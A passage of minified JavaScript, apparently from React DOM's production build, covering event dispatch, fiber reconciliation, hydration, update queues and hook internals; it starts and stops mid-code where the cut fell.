e;if((v||f)&&(f=u.window===u?u:(f=u.ownerDocument)?f.defaultView||f.parentWindow:window,v?(b=t.relatedTarget||t.toElement,v=c,b=b?Yn(b):null,b!==null&&(x=ot(b),b!==x||b.tag!==5&&b.tag!==6)&&(b=null)):(v=null,b=c),v!==b)){if(g=Ro,w="onMouseLeave",p="onMouseEnter",d="mouse",(e==="pointerout"||e==="pointerover")&&(g=Mo,w="onPointerLeave",p="onPointerEnter",d="pointer"),x=v==null?f:gt(v),m=b==null?f:gt(b),f=new g(w,d+"leave",v,t,u),f.target=x,f.relatedTarget=m,w=null,Yn(u)===c&&(g=new g(p,d+"enter",b,t,u),g.target=m,g.relatedTarget=x,w=g),x=w,v&&b)n:{for(g=v,p=b,d=0,m=g;m;m=ut(m))d++;for(m=0,w=p;w;w=ut(w))m++;for(;0<d-m;)g=ut(g),d--;for(;0<m-d;)p=ut(p),m--;for(;d--;){if(g===p||p!==null&&g===p.alternate)break n;g=ut(g),p=ut(p)}g=null}else g=null;v!==null&&$o(h,f,v,g,!1),b!==null&&x!==null&&$o(h,x,b,g,!0)}}e:{if(f=c?gt(c):window,v=f.nodeName&&f.nodeName.toLowerCase(),v==="select"||v==="input"&&f.type==="file")var S=Pf;else if(Do(f))if(Qu)S=Rf;else{S=Lf;var T=Af}else(v=f.nodeName)&&v.toLowerCase()==="input"&&(f.type==="checkbox"||f.type==="radio")&&(S=Nf);if(S&&(S=S(e,c))){Ku(h,S,t,u);break e}T&&T(e,f,c),e==="focusout"&&(T=f._wrapperState)&&T.controlled&&f.type==="number"&&da(f,"number",f.value)}switch(T=c?gt(c):window,e){case"focusin":(Do(T)||T.contentEditable==="true")&&(ft=T,_a=c,ps=null);break;case"focusout":ps=_a=ft=null;break;case"mousedown":Ea=!0;break;case"contextmenu":case"mouseup":case"dragend":Ea=!1,Ho(h,t,u);break;case"selectionchange":if(If)break;case"keydown":case"keyup":Ho(h,t,u)}var P;if(Cl)e:{switch(e){case"compositionstart":var N="onCompositionStart";break e;case"compositionend":N="onCompositionEnd";break e;case"compositionupdate":N="onCompositionUpdate";break e}N=void 0}else ht?Yu(e,t)&&(N="onCompositionEnd"):e==="keydown"&&t.keyCode===229&&(N="onCompositionStart");N&&(qu&&t.locale!=="ko"&&(ht||N!=="onCompositionStart"?N==="onCompositionEnd"&&ht&&(P=Gu()):(Cn=u,_l="value"in Cn?Cn.value:Cn.textContent,ht=!0)),T=jr(c,N),0<T.length&&(N=new Oo(N,e,null,t,u),h.push({event:N,listeners:T}),P?N.data=P:(P=Xu(t),P!==null&&(N.data=P)))),(P=Sf?_f(e,t):Ef(e,t))&&(c=jr(c,"onBeforeInput"),0<c.length&&(u=new Oo("onBeforeInput","beforeinput",null,t,u),h.push({event:u,listeners:c}),u.data=P))}lp(h,n)})}function Es(e,n,t){return{instance:e,listener:n,currentTarget:t}}function jr(e,n){for(var t=n+"Capture",s=[];e!==null;){var r=e,i=r.stateNode;r.tag===5&&i!==null&&(r=i,i=vs(e,t),i!=null&&s.unshift(Es(e,i,r)),i=vs(e,n),i!=null&&s.push(Es(e,i,r))),e=e.return}return s}function ut(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function $o(e,n,t,s,r){for(var i=n._reactName,a=[];t!==null&&t!==s;){var l=t,o=l.alternate,c=l.stateNode;if(o!==null&&o===s)break;l.tag===5&&c!==null&&(l=c,r?(o=vs(t,i),o!=null&&a.unshift(Es(t,o,l))):r||(o=vs(t,i),o!=null&&a.push(Es(t,o,l)))),t=t.return}a.length!==0&&e.push({event:n,listeners:a})}var Bf=/\r\n?/g,Ff=/\u0000|\uFFFD/g;function Go(e){return(typeof e=="string"?e:""+e).replace(Bf,`
`).replace(Ff,"")}function rr(e,n,t){if(n=Go(n),Go(e)!==n&&t)throw Error(A(425))}function Br(){}var Ta=null,Ca=null;function Pa(e,n){return e==="textarea"||e==="noscript"||typeof n.children=="string"||typeof n.children=="number"||typeof n.dangerouslySetInnerHTML=="object"&&n.dangerouslySetInnerHTML!==null&&n.dangerouslySetInnerHTML.__html!=null}var Aa=typeof setTimeout=="function"?setTimeout:void 0,Uf=typeof clearTimeout=="function"?clearTimeout:void 0,qo=typeof Promise=="function"?Promise:void 0,Hf=typeof queueMicrotask=="function"?queueMicrotask:typeof qo<"u"?function(e){return qo.resolve(null).then(e).catch(Vf)}:Aa;function Vf(e){setTimeout(function(){throw e})}function $i(e,n){var t=n,s=0;do{var r=t.nextSibling;if(e.removeChild(t),r&&r.nodeType===8)if(t=r.data,t==="/$"){if(s===0){e.removeChild(r),bs(n);return}s--}else t!=="$"&&t!=="$?"&&t!=="$!"||s++;t=r}while(t);bs(n)}function On(e){for(;e!=null;e=e.nextSibling){var n=e.nodeType;if(n===1||n===3)break;if(n===8){if(n=e.data,n==="$"||n==="$!"||n==="$?")break;if(n==="/$")return null}}return e}function Yo(e){e=e.previousSibling;for(var n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="$"||t==="$!"||t==="$?"){if(n===0)return e;n--}else t==="/$"&&n++}e=e.previousSibling}return null}var Vt=Math.random().toString(36).slice(2),Je="__reactFiber$"+Vt,Ts="__reactProps$"+Vt,fn="__reactContainer$"+Vt,La="__reactEvents$"+Vt,Wf="__reactListeners$"+Vt,$f="__reactHandles$"+Vt;function Yn(e){var n=e[Je];if(n)return n;for(var t=e.parentNode;t;){if(n=t[fn]||t[Je]){if(t=n.alternate,n.child!==null||t!==null&&t.child!==null)for(e=Yo(e);e!==null;){if(t=e[Je])return t;e=Yo(e)}return n}e=t,t=e.parentNode}return null}function Hs(e){return e=e[Je]||e[fn],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function gt(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(A(33))}function hi(e){return e[Ts]||null}var Na=[],yt=-1;function Hn(e){return{current:e}}function G(e){0>yt||(e.current=Na[yt],Na[yt]=null,yt--)}function V(e,n){yt++,Na[yt]=e.current,e.current=n}var Fn={},me=Hn(Fn),Ee=Hn(!1),nt=Fn;function Ot(e,n){var t=e.type.contextTypes;if(!t)return Fn;var s=e.stateNode;if(s&&s.__reactInternalMemoizedUnmaskedChildContext===n)return s.__reactInternalMemoizedMaskedChildContext;var r={},i;for(i in t)r[i]=n[i];return s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=n,e.__reactInternalMemoizedMaskedChildContext=r),r}function Te(e){return e=e.childContextTypes,e!=null}function Fr(){G(Ee),G(me)}function Xo(e,n,t){if(me.current!==Fn)throw Error(A(168));V(me,n),V(Ee,t)}function cp(e,n,t){var s=e.stateNode;if(n=n.childContextTypes,typeof s.getChildContext!="function")return t;s=s.getChildContext();for(var r in s)if(!(r in n))throw Error(A(108,Ph(e)||"Unknown",r));return K({},t,s)}function Ur(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||Fn,nt=me.current,V(me,e),V(Ee,Ee.current),!0}function Ko(e,n,t){var s=e.stateNode;if(!s)throw Error(A(169));t?(e=cp(e,n,nt),s.__reactInternalMemoizedMergedChildContext=e,G(Ee),G(me),V(me,e)):G(Ee),V(Ee,t)}var on=null,fi=!1,Gi=!1;function up(e){on===null?on=[e]:on.push(e)}function Gf(e){fi=!0,up(e)}function Vn(){if(!Gi&&on!==null){Gi=!0;var e=0,n=H;try{var t=on;for(H=1;e<t.length;e++){var s=t[e];do s=s(!0);while(s!==null)}on=null,fi=!1}catch(r){throw on!==null&&(on=on.slice(e+1)),Iu(kl,Vn),r}finally{H=n,Gi=!1}}return null}var vt=[],wt=0,Hr=null,Vr=0,ze=[],De=0,tt=null,cn=1,un="";function Gn(e,n){vt[wt++]=Vr,vt[wt++]=Hr,Hr=e,Vr=n}function pp(e,n,t){ze[De++]=cn,ze[De++]=un,ze[De++]=tt,tt=e;var s=cn;e=un;var r=32-qe(s)-1;s&=~(1<<r),t+=1;var i=32-qe(n)+r;if(30<i){var a=r-r%5;i=(s&(1<<a)-1).toString(32),s>>=a,r-=a,cn=1<<32-qe(n)+r|t<<r|s,un=i+e}else cn=1<<i|t<<r|s,un=e}function Al(e){e.return!==null&&(Gn(e,1),pp(e,1,0))}function Ll(e){for(;e===Hr;)Hr=vt[--wt],vt[wt]=null,Vr=vt[--wt],vt[wt]=null;for(;e===tt;)tt=ze[--De],ze[De]=null,un=ze[--De],ze[De]=null,cn=ze[--De],ze[De]=null}var Le=null,Ae=null,q=!1,$e=null;function dp(e,n){var t=je(5,null,null,0);t.elementType="DELETED",t.stateNode=n,t.return=e,n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)}function Qo(e,n){switch(e.tag){case 5:var t=e.type;return n=n.nodeType!==1||t.toLowerCase()!==n.nodeName.toLowerCase()?null:n,n!==null?(e.stateNode=n,Le=e,Ae=On(n.firstChild),!0):!1;case 6:return n=e.pendingProps===""||n.nodeType!==3?null:n,n!==null?(e.stateNode=n,Le=e,Ae=null,!0):!1;case 13:return n=n.nodeType!==8?null:n,n!==null?(t=tt!==null?{id:cn,overflow:un}:null,e.memoizedState={dehydrated:n,treeContext:t,retryLane:1073741824},t=je(18,null,null,0),t.stateNode=n,t.return=e,e.child=t,Le=e,Ae=null,!0):!1;default:return!1}}function Ra(e){return(e.mode&1)!==0&&(e.flags&128)===0}function Oa(e){if(q){var n=Ae;if(n){var t=n;if(!Qo(e,n)){if(Ra(e))throw Error(A(418));n=On(t.nextSibling);var s=Le;n&&Qo(e,n)?dp(s,t):(e.flags=e.flags&-4097|2,q=!1,Le=e)}}else{if(Ra(e))throw Error(A(418));e.flags=e.flags&-4097|2,q=!1,Le=e}}}function Zo(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;Le=e}function ir(e){if(e!==Le)return!1;if(!q)return Zo(e),q=!0,!1;var n;if((n=e.tag!==3)&&!(n=e.tag!==5)&&(n=e.type,n=n!=="head"&&n!=="body"&&!Pa(e.type,e.memoizedProps)),n&&(n=Ae)){if(Ra(e))throw hp(),Error(A(418));for(;n;)dp(e,n),n=On(n.nextSibling)}if(Zo(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(A(317));e:{for(e=e.nextSibling,n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="/$"){if(n===0){Ae=On(e.nextSibling);break e}n--}else t!=="$"&&t!=="$!"&&t!=="$?"||n++}e=e.nextSibling}Ae=null}}else Ae=Le?On(e.stateNode.nextSibling):null;return!0}function hp(){for(var e=Ae;e;)e=On(e.nextSibling)}function Mt(){Ae=Le=null,q=!1}function Nl(e){$e===null?$e=[e]:$e.push(e)}var qf=vn.ReactCurrentBatchConfig;function Kt(e,n,t){if(e=t.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(t._owner){if(t=t._owner,t){if(t.tag!==1)throw Error(A(309));var s=t.stateNode}if(!s)throw Error(A(147,e));var r=s,i=""+e;return n!==null&&n.ref!==null&&typeof n.ref=="function"&&n.ref._stringRef===i?n.ref:(n=function(a){var l=r.refs;a===null?delete l[i]:l[i]=a},n._stringRef=i,n)}if(typeof e!="string")throw Error(A(284));if(!t._owner)throw Error(A(290,e))}return e}function ar(e,n){throw e=Object.prototype.toString.call(n),Error(A(31,e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e))}function Jo(e){var n=e._init;return n(e._payload)}function fp(e){function n(p,d){if(e){var m=p.deletions;m===null?(p.deletions=[d],p.flags|=16):m.push(d)}}function t(p,d){if(!e)return null;for(;d!==null;)n(p,d),d=d.sibling;return null}function s(p,d){for(p=new Map;d!==null;)d.key!==null?p.set(d.key,d):p.set(d.index,d),d=d.sibling;return p}function r(p,d){return p=Dn(p,d),p.index=0,p.sibling=null,p}function i(p,d,m){return p.index=m,e?(m=p.alternate,m!==null?(m=m.index,m<d?(p.flags|=2,d):m):(p.flags|=2,d)):(p.flags|=1048576,d)}function a(p){return e&&p.alternate===null&&(p.flags|=2),p}function l(p,d,m,w){return d===null||d.tag!==6?(d=Ji(m,p.mode,w),d.return=p,d):(d=r(d,m),d.return=p,d)}function o(p,d,m,w){var S=m.type;return S===dt?u(p,d,m.props.children,w,m.key):d!==null&&(d.elementType===S||typeof S=="object"&&S!==null&&S.$$typeof===bn&&Jo(S)===d.type)?(w=r(d,m.props),w.ref=Kt(p,d,m),w.return=p,w):(w=Tr(m.type,m.key,m.props,null,p.mode,w),w.ref=Kt(p,d,m),w.return=p,w)}function c(p,d,m,w){return d===null||d.tag!==4||d.stateNode.containerInfo!==m.containerInfo||d.stateNode.implementation!==m.implementation?(d=ea(m,p.mode,w),d.return=p,d):(d=r(d,m.children||[]),d.return=p,d)}function u(p,d,m,w,S){return d===null||d.tag!==7?(d=Jn(m,p.mode,w,S),d.return=p,d):(d=r(d,m),d.return=p,d)}function h(p,d,m){if(typeof d=="string"&&d!==""||typeof d=="number")return d=Ji(""+d,p.mode,m),d.return=p,d;if(typeof d=="object"&&d!==null){switch(d.$$typeof){case Xs:return m=Tr(d.type,d.key,d.props,null,p.mode,m),m.ref=Kt(p,null,d),m.return=p,m;case pt:return d=ea(d,p.mode,m),d.return=p,d;case bn:var w=d._init;return h(p,w(d._payload),m)}if(ts(d)||$t(d))return d=Jn(d,p.mode,m,null),d.return=p,d;ar(p,d)}return null}function f(p,d,m,w){var S=d!==null?d.key:null;if(typeof m=="string"&&m!==""||typeof m=="number")return S!==null?null:l(p,d,""+m,w);if(typeof m=="object"&&m!==null){switch(m.$$typeof){case Xs:return m.key===S?o(p,d,m,w):null;case pt:return m.key===S?c(p,d,m,w):null;case bn:return S=m._init,f(p,d,S(m._payload),w)}if(ts(m)||$t(m))return S!==null?null:u(p,d,m,w,null);ar(p,m)}return null}function v(p,d,m,w,S){if(typeof w=="string"&&w!==""||typeof w=="number")return p=p.get(m)||null,l(d,p,""+w,S);if(typeof w=="object"&&w!==null){switch(w.$$typeof){case Xs:return p=p.get(w.key===null?m:w.key)||null,o(d,p,w,S);case pt:return p=p.get(w.key===null?m:w.key)||null,c(d,p,w,S);case bn:var T=w._init;return v(p,d,m,T(w._payload),S)}if(ts(w)||$t(w))return p=p.get(m)||null,u(d,p,w,S,null);ar(d,w)}return null}function b(p,d,m,w){for(var S=null,T=null,P=d,N=d=0,B=null;P!==null&&N<m.length;N++){P.index>N?(B=P,P=null):B=P.sibling;var D=f(p,P,m[N],w);if(D===null){P===null&&(P=B);break}e&&P&&D.alternate===null&&n(p,P),d=i(D,d,N),T===null?S=D:T.sibling=D,T=D,P=B}if(N===m.length)return t(p,P),q&&Gn(p,N),S;if(P===null){for(;N<m.length;N++)P=h(p,m[N],w),P!==null&&(d=i(P,d,N),T===null?S=P:T.sibling=P,T=P);return q&&Gn(p,N),S}for(P=s(p,P);N<m.length;N++)B=v(P,p,N,m[N],w),B!==null&&(e&&B.alternate!==null&&P.delete(B.key===null?N:B.key),d=i(B,d,N),T===null?S=B:T.sibling=B,T=B);return e&&P.forEach(function(Z){return n(p,Z)}),q&&Gn(p,N),S}function g(p,d,m,w){var S=$t(m);if(typeof S!="function")throw Error(A(150));if(m=S.call(m),m==null)throw Error(A(151));for(var T=S=null,P=d,N=d=0,B=null,D=m.next();P!==null&&!D.done;N++,D=m.next()){P.index>N?(B=P,P=null):B=P.sibling;var Z=f(p,P,D.value,w);if(Z===null){P===null&&(P=B);break}e&&P&&Z.alternate===null&&n(p,P),d=i(Z,d,N),T===null?S=Z:T.sibling=Z,T=Z,P=B}if(D.done)return t(p,P),q&&Gn(p,N),S;if(P===null){for(;!D.done;N++,D=m.next())D=h(p,D.value,w),D!==null&&(d=i(D,d,N),T===null?S=D:T.sibling=D,T=D);return q&&Gn(p,N),S}for(P=s(p,P);!D.done;N++,D=m.next())D=v(P,p,N,D.value,w),D!==null&&(e&&D.alternate!==null&&P.delete(D.key===null?N:D.key),d=i(D,d,N),T===null?S=D:T.sibling=D,T=D);return e&&P.forEach(function(ge){return n(p,ge)}),q&&Gn(p,N),S}function x(p,d,m,w){if(typeof m=="object"&&m!==null&&m.type===dt&&m.key===null&&(m=m.props.children),typeof m=="object"&&m!==null){switch(m.$$typeof){case Xs:e:{for(var S=m.key,T=d;T!==null;){if(T.key===S){if(S=m.type,S===dt){if(T.tag===7){t(p,T.sibling),d=r(T,m.props.children),d.return=p,p=d;break e}}else if(T.elementType===S||typeof S=="object"&&S!==null&&S.$$typeof===bn&&Jo(S)===T.type){t(p,T.sibling),d=r(T,m.props),d.ref=Kt(p,T,m),d.return=p,p=d;break e}t(p,T);break}else n(p,T);T=T.sibling}m.type===dt?(d=Jn(m.props.children,p.mode,w,m.key),d.return=p,p=d):(w=Tr(m.type,m.key,m.props,null,p.mode,w),w.ref=Kt(p,d,m),w.return=p,p=w)}return a(p);case pt:e:{for(T=m.key;d!==null;){if(d.key===T)if(d.tag===4&&d.stateNode.containerInfo===m.containerInfo&&d.stateNode.implementation===m.implementation){t(p,d.sibling),d=r(d,m.children||[]),d.return=p,p=d;break e}else{t(p,d);break}else n(p,d);d=d.sibling}d=ea(m,p.mode,w),d.return=p,p=d}return a(p);case bn:return T=m._init,x(p,d,T(m._payload),w)}if(ts(m))return b(p,d,m,w);if($t(m))return g(p,d,m,w);ar(p,m)}return typeof m=="string"&&m!==""||typeof m=="number"?(m=""+m,d!==null&&d.tag===6?(t(p,d.sibling),d=r(d,m),d.return=p,p=d):(t(p,d),d=Ji(m,p.mode,w),d.return=p,p=d),a(p)):t(p,d)}return x}var It=fp(!0),mp=fp(!1),Wr=Hn(null),$r=null,kt=null,Rl=null;function Ol(){Rl=kt=$r=null}function Ml(e){var n=Wr.current;G(Wr),e._currentValue=n}function Ma(e,n,t){for(;e!==null;){var s=e.alternate;if((e.childLanes&n)!==n?(e.childLanes|=n,s!==null&&(s.childLanes|=n)):s!==null&&(s.childLanes&n)!==n&&(s.childLanes|=n),e===t)break;e=e.return}}function Pt(e,n){$r=e,Rl=kt=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&n&&(Se=!0),e.firstContext=null)}function Fe(e){var n=e._currentValue;if(Rl!==e)if(e={context:e,memoizedValue:n,next:null},kt===null){if($r===null)throw Error(A(308));kt=e,$r.dependencies={lanes:0,firstContext:e}}else kt=kt.next=e;return n}var Xn=null;function Il(e){Xn===null?Xn=[e]:Xn.push(e)}function gp(e,n,t,s){var r=n.interleaved;return r===null?(t.next=t,Il(n)):(t.next=r.next,r.next=t),n.interleaved=t,mn(e,s)}function mn(e,n){e.lanes|=n;var t=e.alternate;for(t!==null&&(t.lanes|=n),t=e,e=e.return;e!==null;)e.childLanes|=n,t=e.alternate,t!==null&&(t.childLanes|=n),t=e,e=e.return;return t.tag===3?t.stateNode:null}var xn=!1;function zl(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function yp(e,n){e=e.updateQueue,n.updateQueue===e&&(n.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function dn(e,n){return{eventTime:e,lane:n,tag:0,payload:null,callback:null,next:null}}function Mn(e,n,t){var s=e.updateQueue;if(s===null)return null;if(s=s.shared,U&2){var r=s.pending;return r===null?n.next=n:(n.next=r.next,r.next=n),s.pending=n,mn(e,t)}return r=s.interleaved,r===null?(n.next=n,Il(s)):(n.next=r.next,r.next=n),s.interleaved=n,mn(e,t)}function kr(e,n,t){if(n=n.updateQueue,n!==null&&(n=n.shared,(t&4194240)!==0)){var s=n.lanes;s&=e.pendingLanes,t|=s,n.lanes=t,bl(e,t)}}function ec(e,n){var t=e.updateQueue,s=e.alternate;if(s!==null&&(s=s.updateQueue,t===s)){var r=null,i=null;if(t=t.firstBaseUpdate,t!==null){do{var a={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};i===null?r=i=a:i=i.next=a,t=t.next}while(t!==null);i===null?r=i=n:i=i.next=n}else r=i=n;t={baseState:s.baseState,firstBaseUpdate:r,lastBaseUpdate:i,shared:s.shared,effects:s.effects},e.updateQueue=t;return}e=t.lastBaseUpdate,e===null?t.firstBaseUpdate=n:e.next=n,t.lastBaseUpdate=n}function Gr(e,n,t,s){var r=e.updateQueue;xn=!1;var i=r.firstBaseUpdate,a=r.lastBaseUpdate,l=r.shared.pending;if(l!==null){r.shared.pending=null;var o=l,c=o.next;o.next=null,a===null?i=c:a.next=c,a=o;var u=e.alternate;u!==null&&(u=u.updateQueue,l=u.lastBaseUpdate,l!==a&&(l===null?u.firstBaseUpdate=c:l.next=c,u.lastBaseUpdate=o))}if(i!==null){var h=r.baseState;a=0,u=c=o=null,l=i;do{var f=l.lane,v=l.eventTime;if((s&f)===f){u!==null&&(u=u.next={eventTime:v,lane:0,tag:l.tag,payload:l.payload,callback:l.callback,next:null});e:{var b=e,g=l;switch(f=n,v=t,g.tag){case 1:if(b=g.payload,typeof b=="function"){h=b.call(v,h,f);break e}h=b;break e;case 3:b.flags=b.flags&-65537|128;case 0:if(b=g.payload,f=typeof b=="function"?b.call(v,h,f):b,f==null)break e;h=K({},h,f);break e;case 2:xn=!0}}l.callback!==null&&l.lane!==0&&(e.flags|=64,f=r.effects,f===null?r.effects=[l]:f.push(l))}else v={eventTime:v,lane:f,tag:l.tag,payload:l.payload,callback:l.callback,next:null},u===null?(c=u=v,o=h):u=u.next=v,a|=f;if(l=l.next,l===null){if(l=r.shared.pending,l===null)break;f=l,l=f.next,f.next=null,r.lastBaseUpdate=f,r.shared.pending=null}}while(!0);if(u===null&&(o=h),r.baseState=o,r.firstBaseUpdate=c,r.lastBaseUpdate=u,n=r.shared.interleaved,n!==null){r=n;do a|=r.lane,r=r.next;while(r!==n)}else i===null&&(r.shared.lanes=0);rt|=a,e.lanes=a,e.memoizedState=h}}function nc(e,n,t){if(e=n.effects,n.effects=null,e!==null)for(n=0;n<e.length;n++){var s=e[n],r=s.callback;if(r!==null){if(s.callback=null,s=t,typeof r!="function")throw Error(A(191,r));r.call(s)}}}var Vs={},nn=Hn(Vs),Cs=Hn(Vs),Ps=Hn(Vs);function Kn(e){if(e===Vs)throw Error(A(174));return e}function Dl(e,n){switch(V(Ps,n),V(Cs,e),V(nn,Vs),e=n.nodeType,e){case 9:case 11:n=(n=n.documentElement)?n.namespaceURI:fa(null,"");break;default:e=e===8?n.parentNode:n,n=e.namespaceURI||null,e=e.tagName,n=fa(n,e)}G(nn),V(nn,n)}function zt(){G(nn),G(Cs),G(Ps)}function vp(e){Kn(Ps.current);var n=Kn(nn.current),t=fa(n,e.type);n!==t&&(V(Cs,e),V(nn,t))}function jl(e){Cs.current===e&&(G(nn),G(Cs))}var Y=Hn(0);function qr(e){for(var n=e;n!==null;){if(n.tag===13){var t=n.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||t.data==="$!"))return n}else if(n.tag===19&&n.memoizedProps.revealOrder!==void 0){if(n.flags&128)return n}else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return null;n=n.return}n.sibling.return=n.return,n=n.sibling}return null}var qi=[];function Bl(){for(var e=0;e<qi.length;e++)qi[e]._workInProgressVersionPrimary=null;qi.length=0}var br=vn.ReactCurrentDispatcher,Yi=vn.ReactCurrentBatchConfig,st=0,X=null,te=null,re=null,Yr=!1,ds=!1,As=0,Yf=0;function de(){throw Error(A(321))}function Fl(e,n){if(n===null)return!1;for(var t=0;t<n.length&&t<e.length;t++)if(!Xe(e[t],n[t]))return!1;return!0}function Ul(e,n,t,s,r,i){if(st=i,X=n,n.memoizedState=null,n.updateQueue=null,n.lanes=0,br.current=e===null||e.memoizedState===null?Zf:Jf,e=t(s,r),ds){i=0;do{if(ds=!1,As=0,25<=i)throw Error(A(301));i+=1,re=te=null,n.updateQueue=null,br.current=em,e=t(s,r)}while(ds)}if(br.current=Xr,n=te!==null&&te.next!==null,st=0,re=te=X=null,Yr=!1,n)throw Error(A(300));return e}function Hl(){var e=As!==0;return As=0,e}function Ze(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return re===null?X.memoizedState=re=e:re=re.next=e,re}function Ue(){if(te===null){var e=X.alternate;e=e!==null?e.memoizedState:null}else e=te.next;var n=re===null?X.memoizedState:re.next;if(n!==null)re=n,te=e;else{if(e===null)throw Error(A(310));te=e,e={memoizedState:te.memoizedState,baseState:te.baseState,baseQueue:te.baseQueue,queue:te.queue,next:null},re===null?X.memoizedState=re=e:re=re.next=e}return re}function Ls(e,n){return typeof n=="function"?n(e):n}function Xi(e){var n=Ue(),t=n.queue;if(t===null)throw Error(A(311));t.lastRenderedReducer=e;var s=te,r=s.baseQueue,i=t.pending;if(i!==null){if(r!==null){var a=r.next;r.next=i.next,i.next=a}s.baseQueue=r=i,t.pending=null}if(r!==null){i=r.next,s=s.baseState;var l=a=null,o=null,c=i;do{var u=c.lane;if((st&u)===u)o!==null&&(o=o.next={lane:0,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null}),s=c.hasEagerState?c.eagerState:e(s,c.action);else{var h={lane:u,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null};o===null?(l=o=h,a=s):o=o.next=h,X.lanes|=u,rt|=u}c=c.next}while(c!==null&&c!==i);o===null?a=s:o.next=l,Xe(s,n.memoizedState)||(Se=!0),n.memoizedState=s,n.baseState=a,n.baseQueue=o,t.lastRenderedState=s}if(e=t.interleaved,e!==null){r=e;do i=r.lane,X.lanes|=i,rt|=i,r=r.next;while(r!==e)}else r===null&&(t.lanes=0);return[n.memoizedState,t.dispatch]}function Ki(e){var n=Ue(),t=n.queue;if(t===null)throw Error(A(311));t.lastRenderedReducer=e;var s=t.dispatch,r=t.pending,i=n.memoizedState;if(r!==null){t.pending=null;var a=r=r.next;do i=e(i,a.action),a=a.next;while(a!==r);Xe(i,n.memoizedState)||(Se=!0),n.memoizedState=i,n.baseQueue===null&&(n.baseState=i),t.lastRenderedState=i}return[i,s]}function wp(){}function kp(e,n){var t=X,s=Ue(),r=n(),i=!Xe(s.memoizedState,r);if(i&&(s.memoizedState=r,Se=!0),s=s.queue,Vl(Sp.bind(null,t,s,e),[e]),s.getSnapshot!==n||i||re!==null&&re.memoizedState.tag&1){if(t.flags|=2048,Ns(9,xp.bind(null,t,s,r,n),void 0,null),ie===null)throw Error(A(349));st&30||bp(t,n,r)}return r}function bp(e,n,t){e.flags|=16384,e={getSnapshot:n,value:t},n=X.updateQueue,n===null?(n={lastEffect:null,stores:null},X.updateQueue=n,n.stores=[e]):(t=n.stores,t===null?n.stores=[e]:t.push(e))}function xp(e,n,t,s){n.value=t,n.getSnapshot=s,_p(n)&&Ep(e)}function Sp(e,n,t){return t(function(){_p(n)&&Ep(e)})}function _p(e){var n=e.getSnapshot;e=e.value;try{var t=n();return!Xe(e,t)}catch{return!0}}function Ep(e){var n=mn(e,1);n!==null&&Ye(n,e,1,-1)}function tc(e){var n=Ze();return typeof e=="function"&&(e=e()),n.memoizedState=n.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Ls,lastRenderedState:e},n.queue=e,e=e.dispatch=Qf.bind(null,X,e),[n.memoizedState,e]}function Ns(e,n,t,s){return e={tag:e,create:n,destroy:t,deps:s,next:null},n=X.updateQueue,n===null?(n={lastEffect:null,stores:null},X.updateQueue=n,n.lastEffect=e.next=e):(t=n.lastEffect,t===null?n.lastEffect=e.next=e:(s=t.next,t.next=e,e.next=s,n.lastEffect=e)),e}function Tp(){return Ue().memoizedState}function xr(e,n,t,s){var r=Ze();X.flags|=e,r.memoizedState=Ns(1|n,t,void 0,s===void 0?null:s)}function mi(e,n,t,s){var r=Ue();s=s===void 0?null:s;var i=void 0;if(te!==null){var a=te.memoizedState;if(i=a.destroy,s!==null&&Fl(s,a.deps)){r.memoizedState=Ns(n,t,i,s);return}}X.flags|=e,r.memoizedState=Ns(1|n,t,i,s)}function sc(e,n){return xr(8390656,8,e,n)}function Vl(e,n){return mi(2048,8,e,n)}function Cp(e,n){return mi(4,2,e,n)}function Pp(e,n){return mi(4,4,e,n)}function Ap(e,n){if(typeof n=="function")return e=e(),n(e),function(){n(null)};if(n!=null)return e=e(),n.current=e,function(){n.current=null}}function Lp(e,n,t){return t=t!=null?t.concat([e]):null,mi(4,4,Ap.bind(null,n,e),t)}function Wl(){}function Np(e,n){var t=Ue();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&Fl(n,s[1])?s[0]:(t.memoizedState=[e,n],e)}function Rp(e,n){var t=Ue();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&Fl(n,s[1])?s[0]:(e=e(),t.memoizedState=[e,n],e)}function Op(e,n,t){return st&21?(Xe(t,n)||(t=ju(),X.lanes|=t,rt|=t,e.baseState=!0),n):(e.baseState&&(e.baseState=!1,Se=!0),e.memoizedState=t)}function Xf(e,n){var t=H;H=t!==0&&4>t?t:4,e(!0);var s=Yi.transition;Yi.transition={};try{e(!1),n()}finally{H=t,Yi.transition=s}}function Mp(){return Ue().memoizedState}function Kf(e,n,t){var s=zn(e);if(t={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null},Ip(e))zp(n,t);else if(t=gp(e,n,t,s),t!==null){var r=we();Ye(t,e,s,r),Dp(t,n,s)}}function Qf(e,n,t){var s=zn(e),r={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null};if(Ip(e))zp(n,r);else{var i=e.alternate;if(e.lanes===0&&(i===null||i.lanes===0)&&(i=n.lastRenderedReducer,i!==null))try{var 